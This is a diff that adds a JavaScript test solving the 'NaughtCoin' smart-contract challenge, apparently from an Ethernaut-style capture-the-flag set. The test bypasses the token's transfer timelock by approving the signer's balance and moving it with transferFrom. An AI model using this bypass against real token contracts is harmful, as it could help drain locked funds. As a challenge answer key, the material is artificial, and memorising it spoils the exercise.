@@ -274,3 +274,28 @@ describe("GatekeeperTwo", function () {
     await deployedSolution.deployed();
   });
 });
+
+describe("NaughtCoin", function () {
+  it("Solution", async function () {
+    const signer = (await ethers.getSigners())[0];
+    const challenge = await ethers.getContractFactory("NaughtCoin");
+    const deployedChallenge = await challenge.deploy(signer.address);
+    await deployedChallenge.deployed();
+
+    const approveTxn = await deployedChallenge.approve(
+      signer.address,
+      await deployedChallenge.balanceOf(signer.address)
+    );
+    await approveTxn.wait();
+
+    const transferFromTxn = await deployedChallenge.transferFrom(
+      signer.address,
+      deployedChallenge.address,
+      await await deployedChallenge.balanceOf(signer.address)
+    );
+    await transferFromTxn.wait();
+
+    const finalBalance = await deployedChallenge.balanceOf(signer.address);
+    expect(finalBalance.isZero()).to.equal(true);
+  });
+});
